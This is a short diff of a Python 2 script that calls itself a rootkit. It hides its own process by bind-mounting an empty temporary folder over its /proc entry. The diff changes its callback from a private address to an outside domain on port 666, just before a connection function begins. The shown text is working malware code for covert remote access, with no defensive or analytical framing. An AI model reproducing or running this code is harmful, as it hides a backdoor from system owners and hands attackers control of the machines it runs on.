@@ -11,8 +11,8 @@ ch = string.uppercase + string.digits
 token = "".join(r.choice(ch) for i in range(5))
 pid = os.getpid()
 os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid, token))
-host = "10.0.0.64"
-port = 5539
+host = "www.algomate.com"
+port = 666
 print "[+]Rootkit is working now , check your connection  .. "
 def MakeConnection(h, p):
     try:
